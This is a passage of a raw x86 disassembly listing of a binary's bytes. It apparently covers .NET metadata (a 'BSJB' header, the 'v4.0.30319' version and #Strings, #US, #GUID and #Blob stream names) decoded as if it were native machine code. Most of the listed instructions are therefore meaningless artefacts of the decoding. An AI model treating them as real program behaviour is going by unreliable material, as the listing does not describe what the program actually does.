  4056c2:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	0a 06                	or     (%esi),%al
  4056c9:	17                   	pop    %ss
  4056ca:	73 10                	jae    0x4056dc
  4056cc:	01 00                	add    %eax,(%eax)
  4056ce:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4056d1:	02 16                	add    (%esi),%dl
  4056d3:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4056d9:	00 0a                	add    %cl,(%edx)
  4056db:	08 6f 4f             	or     %ch,0x4f(%edi)
  4056de:	00 00                	add    %al,(%eax)
  4056e0:	0a de                	or     %dh,%bl
  4056e2:	0a 08                	or     (%eax),%cl
  4056e4:	2c 06                	sub    $0x6,%al
  4056e6:	08 6f 33             	or     %ch,0x33(%edi)
  4056e9:	00 00                	add    %al,(%eax)
  4056eb:	0a dc                	or     %ah,%bl
  4056ed:	06                   	push   %es
  4056ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4056ef:	09 01                	or     %eax,(%ecx)
  4056f1:	00 0a                	add    %cl,(%edx)
  4056f3:	0d de 0a 06 2c       	or     $0x2c060ade,%eax
  4056f8:	06                   	push   %es
  4056f9:	06                   	push   %es
  4056fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4056fb:	33 00                	xor    (%eax),%eax
  4056fd:	00 0a                	add    %cl,(%edx)
  4056ff:	dc 09                	fmull  (%ecx)
  405701:	2a 00                	sub    (%eax),%al
  405703:	00 01                	add    %al,(%ecx)
  405705:	1c 00                	sbb    $0x0,%al
  405707:	00 02                	add    %al,(%edx)
  405709:	00 20                	add    %ah,(%eax)
  40570b:	00 13                	add    %dl,(%ebx)
  40570d:	33 00                	xor    (%eax),%eax
  40570f:	0a 00                	or     (%eax),%al
  405711:	00 00                	add    %al,(%eax)
  405713:	00 02                	add    %al,(%edx)
  405715:	00 06                	add    %al,(%esi)
  405717:	00 40 46             	add    %al,0x46(%eax)
  40571a:	00 0a                	add    %cl,(%edx)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	00 00                	add    %al,(%eax)
  405720:	42                   	inc    %edx
  405721:	53                   	push   %ebx
  405722:	4a                   	dec    %edx
  405723:	42                   	inc    %edx
  405724:	01 00                	add    %eax,(%eax)
  405726:	01 00                	add    %eax,(%eax)
  405728:	00 00                	add    %al,(%eax)
  40572a:	00 00                	add    %al,(%eax)
  40572c:	0c 00                	or     $0x0,%al
  40572e:	00 00                	add    %al,(%eax)
  405730:	76 34                	jbe    0x405766
  405732:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405735:	33 30                	xor    (%eax),%esi
  405737:	33 31                	xor    (%ecx),%esi
  405739:	39 00                	cmp    %eax,(%eax)
  40573b:	00 00                	add    %al,(%eax)
  40573d:	00 05 00 6c 00 00    	add    %al,0x6c00
  405743:	00 64 1d 00          	add    %ah,0x0(%ebp,%ebx,1)
  405747:	00 23                	add    %ah,(%ebx)
  405749:	7e 00                	jle    0x40574b
  40574b:	00 d0                	add    %dl,%al
  40574d:	1d 00 00 74 26       	sbb    $0x26740000,%eax
  405752:	00 00                	add    %al,(%eax)
  405754:	23 53 74             	and    0x74(%ebx),%edx
  405757:	72 69                	jb     0x4057c2
  405759:	6e                   	outsb  %ds:(%esi),(%dx)
  40575a:	67 73 00             	addr16 jae 0x40575d
  40575d:	00 00                	add    %al,(%eax)
  40575f:	00 44 44 00          	add    %al,0x0(%esp,%eax,2)
  405763:	00 a0 27 00 00 23    	add    %ah,0x23000027(%eax)
  405769:	55                   	push   %ebp
  40576a:	53                   	push   %ebx
  40576b:	00 e4                	add    %ah,%ah
  40576d:	6b 00 00             	imul   $0x0,(%eax),%eax
  405770:	10 00                	adc    %al,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	23 47 55             	and    0x55(%edi),%eax
  405777:	49                   	dec    %ecx
  405778:	44                   	inc    %esp
  405779:	00 00                	add    %al,(%eax)
  40577b:	00 f4                	add    %dh,%ah
  40577d:	6b 00 00             	imul   $0x0,(%eax),%eax
  405780:	68 09 00 00 23       	push   $0x23000009
  405785:	42                   	inc    %edx
  405786:	6c                   	insb   (%dx),%es:(%edi)
  405787:	6f                   	outsl  %ds:(%esi),(%dx)
  405788:	62 00                	bound  %eax,(%eax)
  40578a:	00 00                	add    %al,(%eax)
  40578c:	00 00                	add    %al,(%eax)
  40578e:	00 00                	add    %al,(%eax)
  405790:	02 00                	add    (%eax),%al
  405792:	00 01                	add    %al,(%ecx)
  405794:	57                   	push   %edi
  405795:	9f                   	lahf
  405796:	a2 3f 09 0a 00       	mov    %al,0xa093f
  40579b:	00 00                	add    %al,(%eax)
  40579d:	fa                   	cli
  40579e:	25 33 00 16 00       	and    $0x160033,%eax
  4057a3:	00 01                	add    %al,(%ecx)
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 9b 00 00 00 1d    	add    %bl,0x1d000000(%ebx)
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 45 00             	add    %al,0x0(%ebp)
  4057b2:	00 00                	add    %al,(%eax)
  4057b4:	a1 00 00 00 6e       	mov    0x6e000000,%eax
  4057b9:	00 00                	add    %al,(%eax)
  4057bb:	00 02                	add    %al,(%edx)
  4057bd:	00 00                	add    %al,(%eax)
  4057bf:	00 10                	add    %dl,(%eax)
  4057c1:	01 00                	add    %eax,(%eax)
  4057c3:	00 13                	add    %dl,(%ebx)
  4057c5:	00 00                	add    %al,(%eax)
  4057c7:	00 2d 00 00 00 02    	add    %ch,0x2000000
  4057cd:	00 00                	add    %al,(%eax)
  4057cf:	00 2e                	add    %ch,(%esi)
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 04 00             	add    %al,(%eax,%eax,1)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	12 00                	adc    (%eax),%al
  4057da:	00 00                	add    %al,(%eax)
  4057dc:	1e                   	push   %ds
  4057dd:	00 00                	add    %al,(%eax)
  4057df:	00 04 00             	add    %al,(%eax,%eax,1)
  4057e2:	00 00                	add    %al,(%eax)
  4057e4:	02 00                	add    (%eax),%al
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	06                   	push   %es
  4057e9:	00 00                	add    %al,(%eax)
  4057eb:	00 04 00             	add    %al,(%eax,%eax,1)
  4057ee:	00 00                	add    %al,(%eax)
  4057f0:	02 00                	add    (%eax),%al
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	01 00                	add    %eax,(%eax)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	08 00                	or     %al,(%eax)
  4057fa:	00 00                	add    %al,(%eax)
  4057fc:	04 00                	add    $0x0,%al
  4057fe:	00 00                	add    %al,(%eax)
  405800:	03 00                	add    (%eax),%eax
  405802:	00 00                	add    %al,(%eax)
  405804:	00 00                	add    %al,(%eax)
  405806:	6d                   	insl   (%dx),%es:(%edi)
  405807:	04 01                	add    $0x1,%al
  405809:	00 00                	add    %al,(%eax)
  40580b:	00 00                	add    %al,(%eax)
  40580d:	00 06                	add    %al,(%esi)
  40580f:	00 32                	add    %dh,(%edx)
  405811:	21 c4                	and    %eax,%esp
  405813:	17                   	pop    %ss
  405814:	0a 00                	or     (%eax),%al
  405816:	4c                   	dec    %esp
  405817:	00 b7 1e 0a 00 5f    	add    %dh,0x5f000a1e(%edi)
  40581d:	21 60 20             	and    %esp,0x20(%eax)
  405820:	0a 00                	or     (%eax),%al
  405822:	78 17                	js     0x40583b
  405824:	31 26                	xor    %esp,(%esi)
  405826:	06                   	push   %es
  405827:	00 c4                	add    %al,%ah
  405829:	1c 5d                	sbb    $0x5d,%al
  40582b:	13 06                	adc    (%esi),%eax
  40582d:	00 f9                	add    %bh,%cl
  40582f:	0f b7 1e             	movzwl (%esi),%ebx
  405832:	0a 00                	or     (%eax),%al
  405834:	c7                   	(bad)
  405835:	18 b7 1e 0a 00 29    	sbb    %dh,0x29000a1e(%edi)
  40583b:	20 31                	and    %dh,(%ecx)
  40583d:	26 06                	es push %es
  40583f:	00 bc 21 c4 17 06 00 	add    %bh,0x617c4(%ecx,%eiz,1)
  405846:	8c 13                	mov    %ss,(%ebx)
  405848:	52                   	push   %edx
  405849:	23 06                	and    (%esi),%eax
  40584b:	00 1c 1d c4 1f 06 00 	add    %bl,0x61fc4(,%ebx,1)
  405852:	24 00                	and    $0x0,%al
  405854:	c4 0a                	les    (%edx),%ecx
  405856:	06                   	push   %es
  405857:	00 d6                	add    %dl,%dh
  405859:	0d c4 1f 06 00       	or     $0x61fc4,%eax
  40585e:	a0 17 f6 05 06       	mov    0x605f617,%al
  405863:	00 47 18             	add    %al,0x18(%edi)
  405866:	c4 17                	les    (%edi),%edx
  405868:	0a 00                	or     (%eax),%al
  40586a:	4e                   	dec    %esi
  40586b:	20 ff                	and    %bh,%bh
  40586d:	1d 0e 00 5f 1a       	sbb    $0x1a5f000e,%eax
  405872:	99                   	cltd
  405873:	13 0e                	adc    (%esi),%ecx
  405875:	00 00                	add    %al,(%eax)
  405877:	21 99 13 06 00 cf    	and    %ebx,-0x30fff9ed(%ecx)
  40587d:	24 5d                	and    $0x5d,%al
  40587f:	13 0a                	adc    (%edx),%ecx
  405881:	00 4a 1f             	add    %cl,0x1f(%edx)
  405884:	2b 00                	sub    (%eax),%eax
  405886:	12 00                	adc    (%eax),%al
  405888:	19 00                	sbb    %eax,(%eax)
  40588a:	4f                   	dec    %edi
  40588b:	1e                   	push   %ds
  40588c:	12 00                	adc    (%eax),%al
  40588e:	01 00                	add    %eax,(%eax)
  405890:	c4 17                	les    (%edi),%edx
  405892:	12 00                	adc    (%eax),%al
  405894:	2f                   	das
  405895:	10 4f 1e             	adc    %cl,0x1e(%edi)
  405898:	06                   	push   %es
  405899:	00 8c 0f c4 17 06 00 	add    %cl,0x617c4(%edi,%ecx,1)
  4058a0:	3c 11                	cmp    $0x11,%al
  4058a2:	4f                   	dec    %edi
  4058a3:	1e                   	push   %ds
  4058a4:	06                   	push   %es
  4058a5:	00 a9 11 4f 1e 06    	add    %ch,0x61e4f11(%ecx)
  4058ab:	00 59 10             	add    %bl,0x10(%ecx)
  4058ae:	ff 1d 6f 00 6f 1e    	lcall  *0x1e6f006f
  4058b4:	00 00                	add    %al,(%eax)
  4058b6:	06                   	push   %es
  4058b7:	00 81 10 6a 19 06    	add    %al,0x6196a10(%ecx)
  4058bd:	00 08                	add    %cl,(%eax)
  4058bf:	11 6a 19             	adc    %ebp,0x19(%edx)
  4058c2:	06                   	push   %es
  4058c3:	00 e9                	add    %ch,%cl
  4058c5:	10 6a 19             	adc    %ch,0x19(%edx)
  4058c8:	06                   	push   %es
  4058c9:	00 90 11 6a 19 06    	add    %dl,0x6196a11(%eax)
  4058cf:	00 5c 11 6a          	add    %bl,0x6a(%ecx,%edx,1)
  4058d3:	19 06                	sbb    %eax,(%esi)
  4058d5:	00 75 11             	add    %dh,0x11(%ebp)
  4058d8:	6a 19                	push   $0x19
  4058da:	06                   	push   %es
  4058db:	00 98 10 6a 19 06    	add    %bl,0x6196a10(%eax)
  4058e1:	00 6d 10             	add    %ch,0x10(%ebp)
  4058e4:	30 1e                	xor    %bl,(%esi)
  4058e6:	06                   	push   %es
  4058e7:	00 cc                	add    %cl,%ah
  4058e9:	10 6a 19             	adc    %ch,0x19(%edx)
  4058ec:	06                   	push   %es
  4058ed:	00 b3 10 b0 13 06    	add    %dh,0x613b010(%ebx)
  4058f3:	00 3e                	add    %bh,(%esi)
  4058f5:	10 4f 1e             	adc    %cl,0x1e(%edi)
  4058f8:	06                   	push   %es
  4058f9:	00 25 11 6a 19 06    	add    %ah,0x6196a11
  4058ff:	00 5f 0b             	add    %bl,0xb(%edi)
  405902:	5d                   	pop    %ebp
  405903:	13 06                	adc    (%esi),%eax
  405905:	00 01                	add    %al,(%ecx)
  405907:	23 c4                	and    %esp,%eax
  405909:	17                   	pop    %ss
  40590a:	06                   	push   %es
  40590b:	00 43 22             	add    %al,0x22(%ebx)
  40590e:	c4 17                	les    (%edi),%edx
  405910:	06                   	push   %es
  405911:	00 2f                	add    %ch,(%edi)
  405913:	18 c4                	sbb    %al,%ah
  405915:	17                   	pop    %ss
  405916:	06                   	push   %es
  405917:	00 90 13 52 23 0a    	add    %dl,0xa235213(%eax)
  40591d:	00 69 25             	add    %ch,0x25(%ecx)
  405920:	b7 1e                	mov    $0x1e,%bh
  405922:	06                   	push   %es
  405923:	00 ea                	add    %ch,%dl
  405925:	17                   	pop    %ss
  405926:	7f 25                	jg     0x40594d
  405928:	06                   	push   %es
  405929:	00 f1                	add    %dh,%cl
  40592b:	1b 7f 25             	sbb    0x25(%edi),%edi
  40592e:	06                   	push   %es
  40592f:	00 3e                	add    %bh,(%esi)
  405931:	13 7f 25             	adc    0x25(%edi),%edi
  405934:	06                   	push   %es
  405935:	00 f3                	add    %dh,%bl
  405937:	19 c4                	sbb    %eax,%esp
  405939:	17                   	pop    %ss
  40593a:	0a 00                	or     (%eax),%al
  40593c:	56                   	push   %esi
  40593d:	20 4d 21             	and    %cl,0x21(%ebp)
  405940:	0a 00                	or     (%eax),%al
  405942:	da 21                	fisubl (%ecx)
  405944:	4d                   	dec    %ebp
  405945:	21 0a                	and    %ecx,(%edx)
  405947:	00 6e 16             	add    %ch,0x16(%esi)
  40594a:	4d                   	dec    %ebp
  40594b:	21 0a                	and    %ecx,(%edx)
  40594d:	00 b2 25 60 20 0a    	add    %dh,0xa206025(%edx)
  405953:	00 ab 0f 60 20 0a    	add    %ch,0xa20600f(%ebx)
  405959:	00 96 0f 60 20 06    	add    %dl,0x620600f(%esi)
  40595f:	00 1f                	add    %bl,(%edi)
  405961:	14 c4                	adc    $0xc4,%al
  405963:	17                   	pop    %ss
  405964:	06                   	push   %es
  405965:	00 c6                	add    %al,%dh
  405967:	1b c4                	sbb    %esp,%eax
  405969:	17                   	pop    %ss
  40596a:	0a 00                	or     (%eax),%al
  40596c:	b7 1f                	mov    $0x1f,%bh
  40596e:	4d                   	dec    %ebp
  40596f:	21 0a                	and    %ecx,(%edx)
  405971:	00 71 1f             	add    %dh,0x1f(%ecx)
  405974:	4d                   	dec    %ebp
  405975:	21 06                	and    %eax,(%esi)
  405977:	00 d7                	add    %dl,%bh
  405979:	1f                   	pop    %ds
  40597a:	c4 17                	les    (%edi),%edx
  40597c:	06                   	push   %es
  40597d:	00 e2                	add    %ah,%dl
  40597f:	0d c4 17 0a 00       	or     $0xa17c4,%eax
  405984:	6a 17                	push   $0x17
  405986:	60                   	pusha
  405987:	20 0a                	and    %cl,(%edx)
  405989:	00 c3                	add    %al,%bl
  40598b:	15 31 26 0a 00       	adc    $0xa2631,%eax
  405990:	aa                   	stos   %al,%es:(%edi)
  405991:	22 4d 21             	and    0x21(%ebp),%cl
  405994:	0a 00                	or     (%eax),%al
  405996:	7c 19                	jl     0x4059b1
  405998:	b7 1e                	mov    $0x1e,%bh
  40599a:	0a 00                	or     (%eax),%al
  40599c:	95                   	xchg   %eax,%ebp
  40599d:	1f                   	pop    %ds
  40599e:	4b                   	dec    %ebx
  40599f:	19 06                	sbb    %eax,(%esi)
  4059a1:	00 e9                	add    %ch,%cl
  4059a3:	11 c4                	adc    %eax,%esp
  4059a5:	17                   	pop    %ss
  4059a6:	06                   	push   %es
  4059a7:	00 e7                	add    %ah,%bh
  4059a9:	15 5d 13 06 00       	adc    $0x6135d,%eax
  4059ae:	b5 15                	mov    $0x15,%ch
  4059b0:	c4 17                	les    (%edi),%edx
  4059b2:	0a 00                	or     (%eax),%al
  4059b4:	ed                   	in     (%dx),%eax
  4059b5:	14 c4                	adc    $0xc4,%al
  4059b7:	17                   	pop    %ss
  4059b8:	0a 00                	or     (%eax),%al
  4059ba:	78 0f                	js     0x4059cb
  4059bc:	c4 17                	les    (%edi),%edx
  4059be:	06                   	push   %es
  4059bf:	00 fc                	add    %bh,%ah
  4059c1:	1c c4                	sbb    $0xc4,%al
  4059c3:	17                   	pop    %ss
  4059c4:	06                   	push   %es
  4059c5:	00 e8                	add    %ch,%al
  4059c7:	22 5d 13             	and    0x13(%ebp),%bl
  4059ca:	06                   	push   %es
  4059cb:	00 9a 17 f6 05 06    	add    %bl,0x605f617(%edx)
  4059d1:	00 87 1d 5d 13 0a    	add    %al,0xa135d1d(%edi)
  4059d7:	00 a7 0d 60 20 06    	add    %ah,0x620600d(%edi)
  4059dd:	00 ab 01 c4 17 06    	add    %ch,0x617c401(%ebx)
  4059e3:	00 23                	add    %ah,(%ebx)
  4059e5:	1c 52                	sbb    $0x52,%al
  4059e7:	23 33                	and    (%ebx),%esi
  4059e9:	00 65 1d             	add    %ah,0x1d(%ebp)
  4059ec:	00 00                	add    %al,(%eax)
  4059ee:	06                   	push   %es
  4059ef:	00 68 00             	add    %ch,0x0(%eax)
  4059f2:	c4 17                	les    (%edi),%edx
  4059f4:	06                   	push   %es
  4059f5:	00 5f 00             	add    %bl,0x0(%edi)
  4059f8:	c4 17                	les    (%edi),%edx
  4059fa:	06                   	push   %es
  4059fb:	00 f0                	add    %dh,%al
  4059fd:	0d c4 17 06 00       	or     $0x617c4,%eax
  405a02:	56                   	push   %esi
  405a03:	0e                   	push   %cs
  405a04:	c4 17                	les    (%edi),%edx
  405a06:	06                   	push   %es
  405a07:	00 3b                	add    %bh,(%ebx)
  405a09:	0f c4 17 06          	pinsrw $0x6,(%edi),%mm2
  405a0d:	00 5f 17             	add    %bl,0x17(%edi)
  405a10:	f6 05 06 00 5d 0e f6 	testb  $0xf6,0xe5d0006
  405a17:	05 06 00 57 0d       	add    $0xd570006,%eax
  405a1c:	f6 05 06 00 39 20 f6 	testb  $0xf6,0x20390006
  405a23:	05 06 00 b6 0f       	add    $0xfb60006,%eax
  405a28:	f6 05 06 00 1a 20 4f 	testb  $0x4f,0x201a0006
  405a2f:	1e                   	push   %ds
  405a30:	06                   	push   %es
  405a31:	00 37                	add    %dh,(%edi)
  405a33:	25 c4 17 06 00       	and    $0x617c4,%eax
  405a38:	02 0e                	add    (%esi),%cl
  405a3a:	c4 17                	les    (%edi),%edx
  405a3c:	06                   	push   %es
  405a3d:	00 ba 18 c4 17 06    	add    %bh,0x617c418(%edx)
  405a43:	00 6e 1a             	add    %ch,0x1a(%esi)
  405a46:	f6 05 0a 00 be 1a ff 	testb  $0xff,0x1abe000a
  405a4d:	1d 06 00 73 25       	sbb    $0x25730006,%eax
  405a52:	2b 00                	sub    (%eax),%eax
  405a54:	06                   	push   %es
  405a55:	00 de                	add    %bl,%dh
  405a57:	1c f6                	sbb    $0xf6,%al
  405a59:	05 06 00 af 14       	add    $0x14af0006,%eax
  405a5e:	f6 05 0a 00 8d 0e ff 	testb  $0xff,0xe8d000a
  405a65:	1d 06 00 81 1a       	sbb    $0x1a810006,%eax
  405a6a:	f6 05 0a 00 ab 0e ff 	testb  $0xff,0xeab000a
  405a71:	1d 06 00 02 26       	sbb    $0x26020006,%eax
  405a76:	2b 00                	sub    (%eax),%eax
  405a78:	16                   	push   %ss
  405a79:	00 42 1f             	add    %al,0x1f(%edx)
  405a7c:	df 0a                	fisttps (%edx)
  405a7e:	06                   	push   %es
  405a7f:	00 f5                	add    %dh,%ch
  405a81:	15 2b 00 06 00       	adc    $0x6002b,%eax
  405a86:	eb 1c                	jmp    0x405aa4
  405a88:	f6 05 06 00 77 1a f6 	testb  $0xf6,0x1a770006
  405a8f:	05 16 00 90 1a       	add    $0x1a900016,%eax
  405a94:	12 1e                	adc    (%esi),%bl
  405a96:	1a 00                	sbb    (%eax),%al
  405a98:	91                   	xchg   %eax,%ecx
  405a99:	1c 31                	sbb    $0x31,%al
  405a9b:	22 1a                	and    (%edx),%bl
  405a9d:	00 96 19 31 22 bb    	add    %dl,-0x44ddcee7(%esi)
  405aa3:	01 28                	add    %ebp,(%eax)
  405aa5:	1d 00 00 1a 00       	sbb    $0x1a0000,%eax
  405aaa:	24 21                	and    $0x21,%al
  405aac:	31 22                	xor    %esp,(%edx)
  405aae:	06                   	push   %es
  405aaf:	00 af 1d c4 17 06    	add    %ch,0x617c41d(%edi)
  405ab5:	00 46 00             	add    %al,0x0(%esi)
  405ab8:	c4 17                	les    (%edi),%edx
  405aba:	12 00                	adc    (%eax),%al
  405abc:	d7                   	xlat   %ds:(%ebx)
  405abd:	0d b4 1b 06 00       	or     $0x61bb4,%eax
  405ac2:	0b 00                	or     (%eax),%eax
  405ac4:	c4 0a                	les    (%edx),%ecx
  405ac6:	06                   	push   %es
  405ac7:	00 bb 17 c4 17 06    	add    %bh,0x617c417(%ebx)
  405acd:	00 d8                	add    %bl,%al
  405acf:	1b 7f 25             	sbb    0x25(%edi),%edi
  405ad2:	06                   	push   %es
  405ad3:	00 fe                	add    %bh,%dh
  405ad5:	17                   	pop    %ss
  405ad6:	7f 25                	jg     0x405afd
  405ad8:	1e                   	push   %ds
  405ad9:	00 3f                	add    %bh,(%edi)
  405adb:	19 a2 1f 06 00 45    	sbb    %esp,0x4500061f(%edx)
  405ae1:	26 80 16 06          	adcb   $0x6,%es:(%esi)
  405ae5:	00 9a 16 80 16 06    	add    %bl,0x6168016(%edx)
  405aeb:	00 6b 0e             	add    %ch,0xe(%ebx)
  405aee:	80 16 06             	adcb   $0x6,(%esi)
  405af1:	00 c1                	add    %al,%cl
  405af3:	0b c4                	or     %esp,%eax
  405af5:	17                   	pop    %ss
  405af6:	06                   	push   %es
  405af7:	00 49 0e             	add    %cl,0xe(%ecx)
  405afa:	5d                   	pop    %ebp
  405afb:	13 0a                	adc    (%edx),%ecx
  405afd:	00 aa 1c 2b 00 0a    	add    %ch,0xa002b1c(%edx)
  405b03:	00 81 20 2b 00 06    	add    %al,0x6002b20(%ecx)
  405b09:	00 d1                	add    %dl,%cl
  405b0b:	0c 2b                	or     $0x2b,%al
  405b0d:	00 06                	add    %al,(%esi)
  405b0f:	00 d1                	add    %dl,%cl
  405b11:	18 c4                	sbb    %al,%ah
  405b13:	17                   	pop    %ss
  405b14:	06                   	push   %es
  405b15:	00 a9 25 6a 19 06    	add    %ch,0x6196a25(%ecx)
  405b1b:	00 b1 0f c4 17 06    	add    %dh,0x617c40f(%ecx)
  405b21:	00 70 1d             	add    %dh,0x1d(%eax)
  405b24:	c4 17                	les    (%edi),%edx
  405b26:	06                   	push   %es
  405b27:	00 25 0e c4 17 22    	add    %ah,0x2217c40e
  405b2d:	00 9d 1a 31 1c 22    	add    %bl,0x221c311a(%ebp)
  405b33:	00 18                	add    %bl,(%eax)
  405b35:	1f                   	pop    %ds
  405b36:	31 1c 22             	xor    %ebx,(%edx,%eiz,1)
  405b39:	00 58 1c             	add    %bl,0x1c(%eax)
  405b3c:	31 1c 12             	xor    %ebx,(%edx,%edx,1)
  405b3f:	00 50 1c             	add    %dl,0x1c(%eax)
  405b42:	4f                   	dec    %edi
  405b43:	1e                   	push   %ds
  405b44:	22 00                	and    (%eax),%al
  405b46:	30 1f                	xor    %bl,(%edi)
  405b48:	31 1c 06             	xor    %ebx,(%esi,%eax,1)
  405b4b:	00 e5                	add    %ah,%ch
  405b4d:	1e                   	push   %ds
  405b4e:	7f 25                	jg     0x405b75
  405b50:	06                   	push   %es
  405b51:	00 eb                	add    %ch,%bl
  405b53:	19 c4                	sbb    %eax,%esp
  405b55:	17                   	pop    %ss
  405b56:	06                   	push   %es
  405b57:	00 ec                	add    %ch,%ah
  405b59:	1e                   	push   %ds
  405b5a:	7f 25                	jg     0x405b81
  405b5c:	12 00                	adc    (%eax),%al
  405b5e:	0a 1c 7f             	or     (%edi,%edi,2),%bl
  405b61:	25 06 00 82 17       	and    $0x17820006,%eax
  405b66:	7f 25                	jg     0x405b8d
  405b68:	06                   	push   %es
  405b69:	00 7f 00             	add    %bh,0x0(%edi)
  405b6c:	7f 25                	jg     0x405b93
  405b6e:	06                   	push   %es
  405b6f:	00 d5                	add    %dl,%ch
  405b71:	19 c4                	sbb    %eax,%esp
  405b73:	17                   	pop    %ss
  405b74:	06                   	push   %es
  405b75:	00 d7                	add    %dl,%bh
  405b77:	17                   	pop    %ss
  405b78:	7f 25                	jg     0x405b9f
  405b7a:	06                   	push   %es
  405b7b:	00 9c 0d 7f 25 06 00 	add    %bl,0x6257f(%ebp,%ecx,1)
  405b82:	60                   	pusha
  405b83:	0d 7f 25 06 00       	or     $0x6257f,%eax
  405b88:	36 18 7f 25          	sbb    %bh,%ss:0x25(%edi)
  405b8c:	06                   	push   %es
  405b8d:	00 7b 0d             	add    %bh,0xd(%ebx)
  405b90:	7f 25                	jg     0x405bb7
  405b92:	06                   	push   %es
  405b93:	00 be 19 7f 25 06    	add    %bh,0x6257f19(%esi)
  405b99:	00 6e 1c             	add    %ch,0x1c(%esi)
  405b9c:	c4 17                	les    (%edi),%edx
  405b9e:	06                   	push   %es
  405b9f:	00 6f 0b             	add    %ch,0xb(%edi)
  405ba2:	7f 25                	jg     0x405bc9
  405ba4:	0a 00                	or     (%eax),%al
  405ba6:	8f                   	(bad)
  405ba7:	17                   	pop    %ss
  405ba8:	29 19                	sub    %ebx,(%ecx)
  405baa:	0a 00                	or     (%eax),%al
  405bac:	8c 0d 29 19 00 00    	mov    %cs,0x1929
  405bb2:	00 00                	add    %al,(%eax)
  405bb4:	93                   	xchg   %eax,%ebx
  405bb5:	00 00                	add    %al,(%eax)
  405bb7:	00 00                	add    %al,(%eax)
  405bb9:	00 01                	add    %al,(%ecx)
  405bbb:	00 01                	add    %al,(%ecx)
  405bbd:	00 01                	add    %al,(%ecx)
  405bbf:	00 10                	add    %dl,(%eax)
  405bc1:	00 13                	add    %dl,(%ebx)
  405bc3:	09 18                	or     %ebx,(%eax)
  405bc5:	06                   	push   %es
  405bc6:	05 00 01 00 01       	add    $0x1000100,%eax
  405bcb:	00 81 01 10 00 d5    	add    %al,-0x2affefff(%ecx)
  405bd1:	05 18 06 05 00       	add    $0x50618,%eax
  405bd6:	01 00                	add    %eax,(%eax)
  405bd8:	03 00                	add    (%eax),%eax
  405bda:	81 01 10 00 00 06    	addl   $0x6000010,(%ecx)
  405be0:	44                   	inc    %esp
  405be1:	17                   	pop    %ss
  405be2:	05 00 12 00 06       	add    $0x6001200,%eax
  405be7:	00 01                	add    %al,(%ecx)
  405be9:	00 10                	add    %dl,(%eax)
  405beb:	00 dd                	add    %bl,%ch
  405bed:	20 40 06             	and    %al,0x6(%eax)
  405bf0:	05 00 1c 00 22       	add    $0x22001c00,%eax
  405bf5:	00 01                	add    %al,(%ecx)
  405bf7:	00 10                	add    %dl,(%eax)
  405bf9:	00 22                	add    %ah,(%edx)
  405bfb:	1b 40 06             	sbb    0x6(%eax),%eax
  405bfe:	05 00 1d 00 2d       	add    $0x2d001d00,%eax
  405c03:	00 01                	add    %al,(%ecx)
  405c05:	00 10                	add    %dl,(%eax)
  405c07:	00 17                	add    %dl,(%edi)
  405c09:	07                   	pop    %es
  405c0a:	40                   	inc    %eax
  405c0b:	06                   	push   %es
  405c0c:	05 00 1f 00 31       	add    $0x31001f00,%eax
  405c11:	00 01                	add    %al,(%ecx)
  405c13:	00 10                	add    %dl,(%eax)
  405c15:	00 52 04             	add    %dl,0x4(%edx)
  405c18:	40                   	inc    %eax
  405c19:	06                   	push   %es
  405c1a:	05 00 21 00 38       	add    $0x38002100,%eax
  405c1f:	00 01                	add    %al,(%ecx)
  405c21:	01 00                	add    %eax,(%eax)
  405c23:	00 3f                	add    %bh,(%edi)
  405c25:	14 40                	adc    $0x40,%al
  405c27:	06                   	push   %es
  405c28:	3d 00 28 00 63       	cmp    $0x63002800,%eax
  405c2d:	00 00                	add    %al,(%eax)
  405c2f:	00 10                	add    %dl,(%eax)
  405c31:	00 6f 15             	add    %ch,0x15(%edi)
  405c34:	40                   	inc    %eax
  405c35:	06                   	push   %es
  405c36:	05 00 35 00 63       	add    $0x63003500,%eax
  405c3b:	00 00                	add    %al,(%eax)
  405c3d:	00 10                	add    %dl,(%eax)
  405c3f:	00 de                	add    %bl,%dh
  405c41:	1a 40 06             	sbb    0x6(%eax),%al
  405c44:	05 00 35 00 67       	add    $0x67003500,%eax
  405c49:	00 00                	add    %al,(%eax)
  405c4b:	00 10                	add    %dl,(%eax)
  405c4d:	00 7d 04             	add    %bh,0x4(%ebp)
  405c50:	29 1a                	sub    %ebx,(%edx)
  405c52:	05 00 35 00 70       	add    $0x70003500,%eax
  405c57:	00 00                	add    %al,(%eax)
  405c59:	00 10                	add    %dl,(%eax)
  405c5b:	00 61 04             	add    %ah,0x4(%ecx)
  405c5e:	12 13                	adc    (%ebx),%dl
  405c60:	05 00 35 00 72       	add    $0x72003500,%eax
  405c65:	00 00                	add    %al,(%eax)
  405c67:	00 10                	add    %dl,(%eax)
  405c69:	00 3b                	add    %bh,(%ebx)
  405c6b:	0a 12                	or     (%edx),%dl
  405c6d:	13 05 00 35 00 7b    	adc    0x7b003500,%eax
  405c73:	00 81 01 10 00 0d    	add    %al,0xd001001(%ecx)
  405c79:	17                   	pop    %ss
  405c7a:	12 13                	adc    (%ebx),%dl
  405c7c:	05 00 35 00 7e       	add    $0x7e003500,%eax
  405c81:	00 81 01 10 00 43    	add    %al,0x43001001(%ecx)
  405c87:	08 12                	or     %dl,(%edx)
  405c89:	13 05 00 35 00 80    	adc    0x80003500,%eax
  405c8f:	00 80 01 10 00 31    	add    %al,0x31001001(%eax)
  405c95:	03 12                	add    (%edx),%edx
  405c97:	13 05 00 35 00 81    	adc    0x81003500,%eax
  405c9d:	00 02                	add    %al,(%edx)
  405c9f:	01 00                	add    %eax,(%eax)
  405ca1:	00 5a 06             	add    %bl,0x6(%edx)
  405ca4:	00 00                	add    %al,(%eax)
  405ca6:	3d 00 35 00 87       	cmp    $0x87003500,%eax
  405cab:	00 81 01 10 00 a2    	add    %al,-0x5dffefff(%ecx)
